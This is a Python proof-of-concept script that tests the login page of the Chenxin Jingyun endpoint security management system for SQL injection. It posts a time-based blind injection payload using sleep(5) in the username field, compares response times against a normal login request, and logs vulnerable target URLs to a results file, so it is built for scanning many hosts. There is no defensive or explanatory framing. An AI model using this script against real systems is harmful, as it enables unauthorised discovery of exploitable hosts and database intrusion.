import requests,json,argparse,sys,os,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________                   ____  ______                           ______
__  ____/__  /_____________      __  |/ /__(_)______      _____________ ___  /
_  /    __  __ \  _ \_  __ \     __    /__  /__  __ \     __  ___/  __ `/_  / 
/ /___  _  / / /  __/  / / /     _    | _  / _  / / /     _(__  )/ /_/ /_  /  
\____/  /_/ /_/\___//_/ /_/______/_/|_| /_/  /_/ /_/______/____/ \__, / /_/   
                          _/_____/                 _/_____/        /_/        """
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description='辰信景云终端安全管理系统 login sql注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/?v=login'
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/116.0',
        'Accept':'application/json,text/javascript,*/*;q=0.01',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Content-Length':'71',
        'Origin':'https://124.222.29.185:3000',
        'Referer':'https://124.222.29.185:3000/?v=login',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'Te':'trailers',
    }
    data1 = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"
    data2 = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin"
    res1 = requests.post(url=target+payload,headers=headers,data=data1,verify=False,timeout=15)
    res2 = requests.post(url=target+payload,headers=headers,data=data2,verify=False,timeout=15)
    time1 = res1.elapsed.total_seconds()
    time2 = res2.elapsed.total_seconds()
    print(time1,time2)
    if time1-time2 >=4:
        print(f'[+]{target}')
        with open('chenxiresult.txt','a',encoding='utf-8') as fp:
            fp.write(target+'\n')

def exp(target):
    pass

if __name__ == '__main__':
    main()